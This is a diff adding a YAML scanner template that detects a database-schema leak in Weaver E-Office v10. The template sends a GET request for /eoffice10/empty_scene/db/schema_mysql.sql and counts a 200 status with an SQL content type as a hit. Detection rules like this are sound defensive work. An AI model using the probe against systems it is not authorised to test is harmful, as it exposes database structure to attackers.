@@ -1,0 +1,14 @@
+name: 泛微-EOffice-v10-schema_mysql泄露
+description: >
+  数据库文件泄露
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /eoffice10/empty_scene/db/schema_mysql.sql
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    expression:
+      status: 200
+      headers:
+        Content-Type: application/x-sql
